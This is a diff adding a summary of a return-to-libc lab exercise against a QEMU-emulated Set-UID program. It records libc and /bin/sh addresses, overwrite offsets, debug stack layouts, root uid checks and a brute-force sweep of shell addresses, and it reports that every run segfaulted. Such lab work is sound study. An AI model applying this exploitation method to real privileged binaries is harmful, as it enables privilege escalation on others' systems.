@@ -1,0 +1,64 @@
+Task 4.5 Summary
+================
+
+Completed exploit configuration from exploit.c:
+- system() = 0x0001a2bc
+- exit()   = 0x0001a26e
+- /bin/sh  = 0x40800f09
+- X = 42
+- Y = 34
+- Z = 38
+
+Evidence:
+$ sed -n '1,20p' task01_exploit_run.txt
+sh_addr = 0x40800f09
+system_addr = 0x0001a2bc
+exit_addr = 0x0001a26e
+X = 42, Y = 34, Z = 38
+
+$ sed -n '1,20p' task01_debug_layout.txt
+shell=0x40800f09
+buffer=0x40800cca
+saved_ebp=0x40800ce8
+ret_slot=0x40800cec
+arg_slot=0x40800cf0
+ret_offset=34
+arg_offset=38
+Returned Properly
+
+Direct privileged system() sanity checks:
+$ sed -n '1,20p' task01_system_test.txt
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+
+$ sed -n '1,20p' task01_system_env_test.txt
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+
+Set-UID seed context changed the MYSHELL address:
+$ sed -n '1,20p' task01_env_addr_seed.txt
+0x40800f3a
+
+Observed attack result in this environment:
+$ sed -n '1,20p' task01_attack_step1.txt
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+
+Brute-force sweep around the seed-time shell address:
+- tested offsets 30 and 34
+- tested shell addresses from 0x40800f00 to 0x40800f60
+- every run ended with the same segmentation fault
+
+Representative lines from task01_bruteforce_results.txt:
+off=30 addr=0x40800f34
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+----
+off=34 addr=0x40800f34
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+
+Conclusion:
+The addresses, overwrite slots, and direct privileged system("/bin/sh") path were validated,
+but the final return-to-libc jump could not be reproduced stably in the current QEMU-emulated
+Set-UID runtime.
